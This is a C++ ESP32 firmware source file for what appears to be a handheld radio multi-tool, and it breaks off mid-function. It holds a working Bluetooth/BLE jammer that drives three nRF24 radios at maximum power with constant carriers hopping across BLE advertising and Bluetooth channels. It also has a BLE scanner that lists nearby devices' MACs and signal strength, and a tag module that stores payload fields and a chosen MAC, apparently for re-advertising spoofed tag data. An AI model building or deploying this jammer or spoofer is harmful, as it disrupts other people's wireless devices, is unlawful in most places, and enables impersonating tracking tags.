enum OperationMode { BLE_MODULE, Bluetooth_MODULE };
OperationMode currentMode = BLE_MODULE;

bool jammerActive = false;

int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 320
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool jammerToggleRequested = false;

unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 500;

void scroll() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = TFT_WHITE;
    Index++;
  }

  for (int i = 0; i < Index; i++) {
    int yPos = (i * LINE_HEIGHT) + 48;

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void checkButtons() {
  unsigned long currentTime = millis();

  if (pcf.digitalRead(BTN_UP) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    jammerToggleRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_RIGHT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (pcf.digitalRead(BTN_LEFT) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int previousMode = -1;

  tft.fillRect(0, 39, 240, 320, TFT_BLACK);
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);
  tft.setTextColor(WHITE, DARK_GRAY);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, TFT_WHITE);

    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawRoundRect(0, 19, 240, 16, 4, LIGHT_GRAY);
}

void checkModeChange() {
  checkButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 2);
    initializeRadios();
    updateTFT();

    String modeText = "[+] Mode changed to: ";
    modeText += (currentMode == BLE_MODULE) ? "BLE" : "Bluetooth";
    Print(modeText, TFT_WHITE, false);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();

    String jammerText = "[!] Jammer ";
    jammerText += (jammerActive) ? "Activated" : "Deactivated";
    Print(jammerText, jammerActive ? TFT_GREEN : TFT_GREEN, false);
  }
}

void blejamSetup() {

  initializeRadios();

  tft.fillScreen(TFT_BLACK);
  setupTouchscreen();

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  updateTFT();

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);

  Print("[+] System Ready!", TFT_GREEN, true);
}

void blejamLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
    }
  }
}

void exit() {

  jammerActive = false;
  initializeRadios();
}
}

namespace BleScan {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

BLEScan* bleScan;
BLEScanResults bleResults;
bool isScanning = false;
bool isDetailView = false;
int currentIndex = 0;
int listStartIndex = 0;
bool screenNeedsUpdate = true;
bool fullScreenUpdate = true;

static constexpr int yshift = 30;

// Deauther-like list geometry (bigger rows + paging + bottom tab bar).
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of tab bar (y=304..320)
static constexpr int DEVICES_PER_PAGE = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
static int current_page = 0;

unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {220, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static TaskHandle_t bgBleScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static const uint32_t BG_BLE_SCAN_INTERVAL_MS = 15000;
static bool bleInitDone = false;
static const uint32_t BG_BOOT_GRACE_MS = 6000;
static uint32_t bgBootMs = 0;

static void ensureBleInit() {
  if (bleInitDone) return;

  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);
  bleInitDone = true;
}

static void bgBleScanTask(void* ) {
  ensureBleInit();
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
    if (settings().autoBleScan && idleOk && !feature_active && !in_sub_menu) {
      isScanning = true;

      bleResults = bleScan->start(2, false);
      isScanning = false;
      if (bleResults.getCount() >= 0) {
        bgHasResults = (bleResults.getCount() > 0);
        bgLastScanMs = now;
      }
      vTaskDelay(BG_BLE_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
    } else {
      vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
  }
}

void displayScanning() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("Scanning...");

  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }
  tft.setCursor(10, LIST_HEADER_Y + 15);
  tft.println("Wait a moment.");
  delay(100);
  isScanning = false;
}

void startBLEScan() {
  displayScanning();
  isDetailView = false;
  current_page = 0;
  currentIndex = 0;
  listStartIndex = 0;
  isScanning = true;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  ensureBleInit();
  bleResults = bleScan->start(5, false);
  isScanning = false;
  screenNeedsUpdate = true;

  if (bleResults.getCount() >= 0) {
    bgHasResults = (bleResults.getCount() > 0);
    bgLastScanMs = millis();
  }
}

void handleButtons() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  int oldPage = current_page;

  if (!pcf.digitalRead(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      current_page = currentIndex / max(1, DEVICES_PER_PAGE);
      listStartIndex = current_page * DEVICES_PER_PAGE;
      screenNeedsUpdate = true;
      fullScreenUpdate = (current_page != oldPage);
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_DOWN)) {
    if (!isDetailView && currentIndex < bleResults.getCount() - 1) {
      currentIndex++;
      delay(200);
      current_page = currentIndex / max(1, DEVICES_PER_PAGE);
      listStartIndex = current_page * DEVICES_PER_PAGE;
      screenNeedsUpdate = true;
      fullScreenUpdate = (current_page != oldPage);
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      isDetailView = !isDetailView;
      screenNeedsUpdate = true;
      fullScreenUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_LEFT)) {
    delay(200);
    if (isDetailView) {
      isDetailView = false;
      fullScreenUpdate = true;
    } else if (!isScanning) {
      startBLEScan();
      fullScreenUpdate = true;
    }
    screenNeedsUpdate = true;
    lastButtonPress = currentMillis;
  }
}

void updateBLEList() {
  int deviceCount = bleResults.getCount();
  tft.setTextSize(1);

  if (deviceCount <= 0) {
    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("No devices found.");
    tft.setCursor(10, LIST_HEADER_Y + 12);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int totalPages = (deviceCount + DEVICES_PER_PAGE - 1) / DEVICES_PER_PAGE;
  if (current_page < 0) current_page = 0;
  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);
  listStartIndex = current_page * DEVICES_PER_PAGE;

  static int last_rendered_page = -1;
  static int last_rendered_index = -1;

  auto drawRow = [&](int idx, bool selected) {
    if (idx < 0 || idx >= deviceCount) return;
    if (idx < listStartIndex || idx >= listStartIndex + DEVICES_PER_PAGE) return;
    const int row = idx - listStartIndex;
    const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;

    // Clear only this row (avoid overlapping next row).
    tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
    BLEAdvertisedDevice device = bleResults.getDevice(idx);
    String name = device.getName().length() > 0 ? device.getName().c_str() : "Unknown";
    if (name.length() > 22) name = name.substring(0, 22) + "...";

    tft.setCursor(10, y);
    tft.setTextColor(selected ? ORANGE : WHITE);
    tft.print(selected ? "> " : "  ");
    tft.println(name);
  };

  const bool pageChanged = (current_page != last_rendered_page);
  const bool needFull = fullScreenUpdate || pageChanged || (last_rendered_index < 0);

  if (needFull) {
    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("Devices:");

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    const int end_index = min(listStartIndex + DEVICES_PER_PAGE, deviceCount);
    for (int i = listStartIndex; i < end_index; i++) {
      drawRow(i, (i == currentIndex));
    }

    const bool prevDisabled = (current_page == 0);
    const bool nextDisabled = ((current_page + 1) * DEVICES_PER_PAGE >= deviceCount);
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);

    last_rendered_page = current_page;
    last_rendered_index = currentIndex;
    return;
  }

  if (last_rendered_index != currentIndex) {
    drawRow(last_rendered_index, false);
    drawRow(currentIndex, true);
    last_rendered_index = currentIndex;
  }
}

void displayBLEDetails() {

  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);

  const int deviceCount = bleResults.getCount();
  if (deviceCount <= 0) {
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    return;
  }
  if (currentIndex < 0) currentIndex = 0;
  if (currentIndex >= deviceCount) currentIndex = deviceCount - 1;

  BLEAdvertisedDevice device = bleResults.getDevice(currentIndex);
  String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
  String address = device.getAddress().toString().c_str();
  int rssi = device.getRSSI();
  int txPower = device.getTXPower();

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  int y = 50;
  tft.setCursor(10, y);
  tft.print("Device: " + deviceName);
  y += 20;
  tft.setCursor(10, y);
  tft.print("MAC: " + address);
  y += 20;
  tft.setCursor(10, y);
  tft.print("RSSI: " + String(rssi) + " dBm");
  y += 20;
  tft.setCursor(10, y);
  tft.print("Tx Power: " + String(txPower) + " dBm");

  if (device.haveServiceUUID()) {
    y += 20;
    tft.setCursor(10, y);
    tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Service UUID");
  }
  if (device.haveManufacturerData()) {
    String manufacturerData = String((char*)device.getManufacturerData().c_str());
    y += 20;
    tft.setCursor(10, y);
    tft.print("Manufacturer: " + manufacturerData);
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Manufacturer Data");
  }
  if (device.haveServiceData()) {
    String serviceData = String((char*)device.getServiceData().c_str());
    y += 30;
    tft.setCursor(10, y);
    tft.print("Service Data: " + serviceData);
  } else {
    y += 30;
    tft.setCursor(10, y);
    tft.print("No Service Data");
  }

  drawTabBar("Rescan", false, "", true, "Back", false);
}

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, WHITE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!isScanning) {
            startBLEScan();
          }
          break;
        case 1:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 120;
  static uint32_t lastTouchActionMs = 0;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      const uint32_t nowMs = millis();
      if (nowMs - lastTouchActionMs < 250) {
        lastTouchCheck = millis();
        return;
      }
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
              lastTouchActionMs = nowMs;
            }
            break;
          }
        }
      } else if (!isScanning) {
        const int deviceCount = bleResults.getCount();

        // Deauther-like bottom bar has a large touch hitbox.
        if (y >= 290 && y <= 320) {
          const bool prevDisabled = (current_page == 0);
          const bool nextDisabled = ((current_page + 1) * DEVICES_PER_PAGE >= deviceCount);

          if (x >= 0 && x <= 57) {
            drawButton(0, 304, 57, 16, "Rescan", true, false);
            delay(50);
            startBLEScan();
            lastTouchActionMs = nowMs;
          } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
            drawButton(117, 304, 57, 16, "Prev", true, false);
            current_page--;
            if (current_page < 0) current_page = 0;
            currentIndex = current_page * DEVICES_PER_PAGE;
            listStartIndex = current_page * DEVICES_PER_PAGE;
            screenNeedsUpdate = true;
            fullScreenUpdate = true;
            lastTouchActionMs = nowMs;
          } else if (x >= 177 && x <= 240) {
            if (isDetailView) {
              drawButton(177, 304, 57, 16, "Back", true, false);
              isDetailView = false;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (!nextDisabled) {
              drawButton(177, 304, 57, 16, "Next", true, false);
              current_page++;
              currentIndex = current_page * DEVICES_PER_PAGE;
              listStartIndex = current_page * DEVICES_PER_PAGE;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        } else if (!isDetailView) {
          const int listMaxY = LIST_FIRST_ROW_Y + (DEVICES_PER_PAGE * LIST_ROW_H);
          if (deviceCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
            const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
            const int idx = (current_page * DEVICES_PER_PAGE) + row;
            if (idx >= 0 && idx < deviceCount) {
              currentIndex = idx;
              isDetailView = true;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void bleScanSetup() {

  tft.fillScreen(TFT_BLACK);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  runUI();

  setupTouchscreen();

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);

  ensureBleInit();

  if (bgHasResults && bleResults.getCount() > 0) {
    current_page = 0;
    currentIndex = 0;
    listStartIndex = 0;
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    updateBLEList();
  } else {
    startBLEScan();
  }
}

void bleScanLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  tft.drawLine(0, 19, 240, 19, WHITE);
  handleButtons();

  runUI();
  updateStatusBar();

  if (screenNeedsUpdate) {
    screenNeedsUpdate = false;
    if (isScanning) {
      displayScanning();
    } else if (!isDetailView) {
      updateBLEList();
    } else {
      displayBLEDetails();
    }
    if (fullScreenUpdate) fullScreenUpdate = false;
  }
}

void startBackgroundScanner() {
  if (bgBleScanTaskHandle != nullptr) return;
  xTaskCreatePinnedToCore(
    bgBleScanTask,
    "bgBleScan",
    4096,
    nullptr,
    1,
    &bgBleScanTaskHandle,
    0
  );
}

int getLastCount() {

  if (!settings().autoBleScan) return 0;
  return bleResults.getCount();
}

void exit() {

  if (isScanning && bleScan) {
    bleScan->stop();
    isScanning = false;
  }
}
}



namespace BleTag2 {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

BLEScan* bleScan;
BLEScanResults bleResults;
bool isScanning = false;
bool isDetailView = false;
bool isSendView = false;
int currentIndex = 0;
int listStartIndex = 0;
bool screenNeedsUpdate = true;
bool fullScreenUpdate = true;

static constexpr int yshift = 30;

// Deauther-like list geometry (bigger rows + paging + bottom tab bar).
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 34;
static constexpr int LIST_ROW_H = 22;
static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of tab bar (y=304..320)
static constexpr int DEVICES_PER_PAGE = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
static int current_page = 0;

unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

static bool uiDrawn = false;

static bool hasSelectedTag2 = false;
static uint8_t selectedPayload[10] = {19, 100, 1, 14, 0, 86, 0, 12, 0, 1};
static String selectedMac = "C0:FF:EE:C0:DE:01";
static bool advEnabled = false;
static bool advFastMode = true;
static uint8_t fastHours = 14;
static uint16_t slowHours = 86;
static uint8_t connAttempts = 12;
static uint8_t buttonPresses = 19;
static uint8_t batteryLevel = 100;
static uint8_t connectionStateCode = 0;
static uint16_t statusFlags = 0x0001;
static BLEAdvertising* tag2Adv = nullptr;
static unsigned long lastAdvPulseMs = 0;
static int selectedField = 0; // 0=F 1=S 2=C 3=B 4=BAT
static bool baselineValid = false;
static String baselineMac = "C0:FF:EE:C0:DE:01";
static bool baselineFastMode = true;
static uint8_t baselineFastHours = 14;
static uint16_t baselineSlowHours = 86;
static uint8_t baselineConnAttempts = 12;
static uint8_t baselineButtonPresses = 19;
static uint8_t baselineBatteryLevel = 100;
static uint8_t baselineConnectionStateCode = 0;
static uint16_t baselineStatusFlags = 0x0001;

static const char* TAG2_CFG_DIR = "/config/tag2";
static const char* TAG2_LAST_CFG = "/config/tag2/last_profile.txt";
static const char* TAG2_RF_CFG = "/config/tag2/rf_model.cfg";
static const char* TAG2_SCAN_LAST_CFG = "/config/tag2/last_scan_profile.txt";

struct Tag2Profile {
  bool valid = false;
  bool manualSave = false;
  String mac = "";
  bool mode = true;
  uint8_t fast_h = 14;
  uint16_t slow_h = 86;
  uint8_t conn = 12;
  uint8_t btn = 19;
  uint8_t batt = 100;
  uint8_t state = 0;
  uint16_t flags = 0x0001;
};

static std::map<String, Tag2Profile> lastScanProfiles;
static TaskHandle_t liveScanTaskHandle = nullptr;
static volatile bool liveScanRun = false;
static volatile bool liveScanStopReq = false;
static volatile uint32_t liveScanLastUpdateMs = 0;
static volatile uint32_t liveResultsVersion = 0;
static volatile uint32_t uiHoldUntilMs = 0;

static int iconX[ICON_NUM] = {220, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};
static void applySendToAdvertiser();
static bool saveProfileToSd(const Tag2Profile& p, bool updateLastPath);

static void drawHeaderActionIcons(bool saveEnabled, bool loadEnabled, bool showReset, bool resetEnabled) {
  // Compact status-bar icons, aligned with native toolbar style.
  tft.drawBitmap(40, STATUS_BAR_Y_OFFSET, bitmap_icon_floppy, 16, 16, saveEnabled ? UI_TEXT : DARK_GRAY);   // Save
  tft.drawBitmap(60, STATUS_BAR_Y_OFFSET, bitmap_icon_floppy2, 16, 16, loadEnabled ? UI_TEXT : DARK_GRAY);  // Load
  tft.fillRect(80, STATUS_BAR_Y_OFFSET, 16, 16, DARK_GRAY);
  if (showReset) {
    tft.drawBitmap(80, STATUS_BAR_Y_OFFSET, bitmap_icon_undo, 16, 16, resetEnabled ? UI_TEXT : DARK_GRAY);     // Reset
  }
}

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTinyIconButton(int x, int y, const unsigned char* icon) {
  drawButton(x, y, 22, 14, "", false, false);
  if (icon) tft.drawBitmap(x + 3, y - 1, icon, 16, 16, UI_TEXT);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static TaskHandle_t bgBleScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static const uint32_t BG_BLE_SCAN_INTERVAL_MS = 15000;
static bool bleInitDone = false;
static const uint32_t BG_BOOT_GRACE_MS = 6000;
static uint32_t bgBootMs = 0;
static std::vector<int> tag2Indices;
static std::vector<Tag2Profile> loadedProfileList;
static bool showingLoadedProfiles = false;
static bool headerIconsDirty = true;
static int8_t distanceTxPowerAt1m = -59;
static uint8_t distanceN_x10 = 20; // n=2.0 default

static bool parseTag2Payload(BLEAdvertisedDevice& device, uint8_t out[10]) {
  std::string md = device.getManufacturerData();
  if (md.size() < 12) return false;
  const uint8_t* b = (const uint8_t*)md.data();
  if (b[0] != 0x00 || b[1] != 0xFF) return false;
  memcpy(out, b + 2, 10);
  return true;
}

static void rebuildTag2Index() {
  tag2Indices.clear();
  const int total = bleResults.getCount();
  for (int i = 0; i < total; i++) {
    BLEAdvertisedDevice d = bleResults.getDevice(i);
    uint8_t p[10];
    if (parseTag2Payload(d, p)) {
      tag2Indices.push_back(i);
    }
  }
  std::sort(tag2Indices.begin(), tag2Indices.end(), [](int a, int b) {
    BLEAdvertisedDevice da = bleResults.getDevice(a);
    BLEAdvertisedDevice db = bleResults.getDevice(b);
    return da.getRSSI() > db.getRSSI();
  });
}

static int filteredCount() {
  if (showingLoadedProfiles) return (int)loadedProfileList.size();
  return (int)tag2Indices.size();
}

static BLEAdvertisedDevice filteredDevice(int filteredIdx) {
  return bleResults.getDevice(tag2Indices[filteredIdx]);
}

static Tag2Profile filteredProfile(int filteredIdx) {
  if (filteredIdx < 0 || filteredIdx >= (int)loadedProfileList.size()) return Tag2Profile();
  return loadedProfileList[filteredIdx];
}

static void rebuildLoadedProfileListFromCache() {
  loadedProfileList.clear();
  for (const auto& kv : lastScanProfiles) {
    if (kv.second.valid) loadedProfileList.push_back(kv.second);
  }
  std::sort(loadedProfileList.begin(), loadedProfileList.end(), [](const Tag2Profile& a, const Tag2Profile& b) {
    return a.mac < b.mac;
  });
}

static int batteryStepWithJitter() {
  int jitter = random(-3, 4); // [-3, +3]
  int step = 5 + jitter;
  if (step < 1) step = 1;
  return step;
}

static float estimateDistanceMeters(int rssi) {
  if (rssi == 0) return -1.0f;
  const float n = ((float)distanceN_x10) / 10.0f;
  if (n <= 0.0f) return -1.0f;
  const float exponent = ((float)distanceTxPowerAt1m - (float)rssi) / (10.0f * n);
  return powf(10.0f, exponent);
}

static String formatDistance(float meters) {
  if (meters < 0.0f) return "?";
  if (meters < 1.0f) {
    int cm = (int)(meters * 100.0f + 0.5f);
    return String(cm) + "cm";
  }
  if (meters < 10.0f) {
    char b[16];
    snprintf(b, sizeof(b), "%.1fm", meters);
    return String(b);
  }
  int m = (int)(meters + 0.5f);
  return String(m) + "m";
}

static String macToCfgPath(const String& mac) {
  String safe = mac;
  safe.replace(":", "-");
  safe.toUpperCase();
  return String(TAG2_CFG_DIR) + "/" + safe + ".cfg";
}

static bool jsonGetString(const String& s, const char* key, String& out) {
  String k = "\"" + String(key) + "\"";
  int p = s.indexOf(k);
  if (p < 0) return false;
  p = s.indexOf(':', p + k.length());
  if (p < 0) return false;
  int q1 = s.indexOf('"', p + 1);
  if (q1 < 0) return false;
  int q2 = s.indexOf('"', q1 + 1);
  if (q2 < 0) return false;
  out = s.substring(q1 + 1, q2);
  return true;
}

static bool jsonGetInt(const String& s, const char* key, int& out) {
